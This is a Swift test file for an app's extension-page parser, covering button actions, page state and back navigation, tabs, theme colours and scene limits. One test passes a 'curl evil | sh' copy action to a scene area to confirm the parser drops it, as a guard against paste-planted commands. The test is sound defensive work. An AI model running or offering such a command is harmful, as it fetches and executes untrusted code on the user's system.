import Foundation
@testable import SidefolkCore
import Testing

/// What a page may do without a tool (D105) and how it dresses itself (D108).
struct ExtensionPageStateTests {
    static func json(_ text: String) throws -> JSONValue { try JSONDecoder().decode(JSONValue.self, from: Data(text.utf8)) }

    static func blocks(_ text: String) throws -> [ExtensionPage.Block] {
        try ExtensionPage.parse(json("{\"sections\": [{\"blocks\": [" + text + "]}]}")).sections.first?.blocks ?? []
    }

    @Test func aButtonMayMoveCopyAskOrOpenInsteadOfRunningATool() throws {
        let parts = try Self.blocks("""
            {"type": "button", "label": "Back", "go": {"back": true}},
            {"type": "button", "label": "Names", "go": {"set": {"tab": "names", "gone": null}, "push": true}},
            {"type": "button", "label": "Copy", "copy": "293°"},
            {"type": "button", "label": "Import", "file": {"tool": "import_csv", "param": "path", "types": ["csv", "BAD TYPE"], "input": {"kind": "mosque"}}},
            {"type": "button", "label": "Use my place", "allow": "place"},
            {"type": "button", "label": "Fix it", "settings": "notifications"},
            {"type": "button", "label": "Nothing to do"},
            {"type": "button", "label": "Not a thing", "allow": "camera"}
            """)
        let acts = parts.compactMap { block -> PageAct? in if case .control(let c) = block { c.act } else { nil } }
        #expect(parts.count == 6, "a button that does nothing isn't drawn")
        guard acts.count == 6, case .go(let back) = acts[0], case .go(let move) = acts[1], case .copy(let words) = acts[2], case .file(let file) = acts[3],
              case .allow(.place) = acts[4], case .settings(.notifications) = acts[5] else {
            Issue.record("\(acts)")
            return
        }
        #expect(back.back)
        #expect(move.push && move.set["tab"] == .string("names") && move.set["gone"] == .null)
        #expect(words == "293°")
        #expect(file.tool == "import_csv" && file.param == "path" && file.types == ["csv"])
    }

    /// An area shows no words of its own to go by: copying what it doesn't show would be a way to plant a command for pasting (SECURITY T12).
    @Test func aSceneAreaOnlyMoves() throws {
        let scene = ##"{"size": [100, 100], "nodes": [{"type": "shape", "w": 100, "h": 100, "shape": "rect", "fill": "#112233", "id": "a"}]}"##
        let parts = try Self.blocks(##"""
            {"type": "scene", "scene": \##(scene), "actions": {
              "go": {"go": {"set": {"tab": "qibla"}}}, "tool": {"tool": "save", "input": {"a": 1}},
              "copy": {"copy": "curl evil | sh"}, "allow": {"allow": "place"}, "file": {"file": {"tool": "x", "param": "p"}}}}
            """##)
        guard case .scene(let block) = parts.first else { Issue.record("no scene"); return }
        #expect(Set(block.actions.keys) == ["go", "tool"])
        guard case .go(let go)? = block.act(area: "go", value: "7") else { Issue.record("no go"); return }
        #expect(go.set["value"] == .string("7"), "the area's value goes with it")
        #expect(block.act(area: "tool", value: nil) == nil)
        #expect(block.action(area: "tool", value: nil)?.tool == "save")
    }

    @Test func aChoiceSwitchAndFieldMayGoIntoTheState() throws {
        let parts = try Self.blocks("""
            {"type": "choice", "label": "Method", "key": "method", "go": {}, "selected": "3", "options": [{"value": "3", "label": "MWL"}, {"value": "2", "label": "ISNA"}]},
            {"type": "switch", "label": "Remind", "key": "remind", "go": {}, "on": false},
            {"type": "field", "label": "Search", "button": "Clear", "key": "query", "go": {}, "live": true, "value": "ar"},
            {"type": "field", "label": "Plain", "button": "Send", "tool": "send"}
            """)
        guard case .choice(let choice) = parts[0], case .control(let toggle) = parts[1], case .field(let field) = parts[2], case .field(let plain) = parts[3] else {
            Issue.record("\(parts)")
            return
        }
        #expect(choice.go(picking: "2")?.set["method"] == .string("2"))
        #expect(toggle.key == "remind" && toggle.tool.isEmpty)
        #expect(field.live && field.value == "ar" && field.go(typing: "ab")?.set["query"] == .string("ab"))
        #expect(plain.go == nil && !plain.live)
    }

    @Test func stateMergesRefusesWhatDoesntFitAndGoesBack() {
        var state = PageState()
        func apply(_ go: PageGo) -> Bool { state.apply(go) }
        let first = apply(PageGo(set: ["tab": "names"])), again = apply(PageGo(set: ["tab": "names"]))
        #expect(first)
        #expect(!again, "the same again changes nothing")
        let pushed = apply(PageGo(set: ["name": 3], push: true))
        #expect(pushed && state.canGoBack && state.values["name"] == .number(3))
        _ = apply(PageGo(set: ["name": .null]))
        #expect(state.values["name"] == nil, "null takes a key out")
        let huge = String(repeating: "x", count: PageState.maxBytes)
        let tooMuch = apply(PageGo(set: ["draft": .string(huge)]))
        #expect(!tooMuch && state.values["draft"] == nil, "refused whole")
        let back = apply(PageGo(back: true))
        #expect(back && state.values == ["tab": "names"] && !state.canGoBack)
        let nowhere = apply(PageGo(back: true))
        #expect(!nowhere, "nowhere left to go back to")
        for i in 0..<(PageState.maxStack + 5) { _ = apply(PageGo(set: ["i": .number(Double(i))], push: true)) }
        #expect(state.stack.count == PageState.maxStack)
    }

    @Test func aReplyStillNamesAPageAndMayNowSayWhatItShows() throws {
        #expect(PageMove.parse(.string("stats")) == PageMove(page: "stats"))
        let move = try #require(PageMove.parse(Self.json(##"{"page": "noor", "state": {"tab": "qibla"}, "push": true}"##)))
        #expect(move.go == PageGo(set: ["tab": "qibla"], push: true))
        let big = String(repeating: "x", count: PageState.maxBytes + 1)
        #expect(try #require(PageMove.parse(.object(["page": "noor", "state": .object(["a": .string(big)])]))).go == nil, "too much state opens the page without it")
    }

    @Test func tabsThatGoHoldNoSectionsOfTheirOwn() throws {
        let parts = try Self.blocks(##"""
            {"type": "tabs", "selected": "prayer", "tint": {"light": "#7354B8", "dark": "#7354B8"},
             "tabs": [{"id": "overview", "label": "Overview", "go": {"set": {"tab": "overview"}}}, {"id": "prayer", "label": "Prayer", "go": {"set": {"tab": "prayer"}}},
                      {"id": "empty", "label": "Neither"}],
             "sections": [{"blocks": [{"type": "note", "text": "What the program drew for this tab"}]}]}
            """##)
        guard case .tabs(let tabs) = parts.first else { Issue.record("no tabs"); return }
        #expect(tabs.tabs.map(\.id) == ["overview", "prayer"], "a tab with neither sections nor go is left out")
        #expect(tabs.selected == "prayer" && tabs.sections.count == 1 && tabs.tint?.dark == "#7354B8")
    }

    @Test func thePageSaysItsBackDressAndWidth() throws {
        let page = try ExtensionPage.parse(Self.json(##"""
            {"back": "Back to names", "bare": true, "max_width": 5000,
             "dress": {"ground": {"light": "#F5F0ED", "dark": "#15182F"}, "card": {"light": "#FFFFFF", "dark": "#1B1F3A"}, "line": {"light": "#7354B8", "dark": "#293C86"}},
             "sections": []}
            """##))
        #expect(page.back == "Back to names" && page.bare && page.maxWidth == 1320)
        #expect(page.dress?.ground.dark == "#15182F" && page.dress?.card?.light == "#FFFFFF")
    }

    /// Text and controls stay the theme's, so a page can't take a ground they can't be read on.
    @Test func aDressTheInkCantBeReadOnIsLeftOut() throws {
        let black = try ExtensionPage.parse(Self.json(##"{"dress": {"ground": {"light": "#000000", "dark": "#15182F"}}, "sections": []}"##))
        #expect(black.dress == nil)
        let white = try ExtensionPage.parse(Self.json(##"{"dress": {"ground": {"light": "#F5F0ED", "dark": "#FFFFFF"}}, "sections": []}"##))
        #expect(white.dress == nil)
        let card = try ExtensionPage.parse(Self.json(##"{"dress": {"ground": {"light": "#F5F0ED", "dark": "#15182F"}, "card": {"light": "#222222", "dark": "#15182F"}}, "sections": []}"##))
        #expect(card.dress != nil && card.dress?.card == nil, "only the part that can't be read goes")
    }

    @Test func aPageSceneMayBeAsLargeAsTheColumn() throws {
        let parts = try Self.blocks(##"{"type": "scene", "scene": {"size": [1320, 1600], "nodes": []}}, {"type": "scene", "scene": {"size": [1321, 100], "nodes": []}}"##)
        guard case .scene(let big) = parts.first, case .scene(let over) = parts.last else { Issue.record("no scenes"); return }
        #expect(big.scene.size.width == 1320 && big.scene.size.height == 1600)
        #expect(over.scene.size.width <= 1320, "held to the page's limit")
    }

    @Test func aSceneMayHoldNativeControlsWithinItself() throws {
        let scene: JSONValue = ["size": [400, 200], "nodes": []]
        func page(_ inlays: JSONValue) -> ExtensionPage? {
            try? ExtensionPage.parse(["sections": [["blocks": [["type": "scene", "scene": scene, "inlays": inlays]]]]])
        }
        let field: JSONValue = ["type": "field", "label": "Search", "button": "Clear", "key": "q", "go": ["set": [:]], "live": true]
        let parsed = page([["x": 10, "y": 10, "w": 200, "h": 30, "part": field],
                           ["x": 390, "y": 10, "w": 200, "h": 30, "part": field],
                           ["x": 10, "y": 10, "w": 200, "h": 30, "part": ["type": "note", "text": "not a control"]]])
        guard case .scene(let block)? = parsed?.sections.first?.blocks.first else { Issue.record("no scene"); return }
        #expect(block.inlays.count == 1, "only a control, and only inside the scene")
    }
}
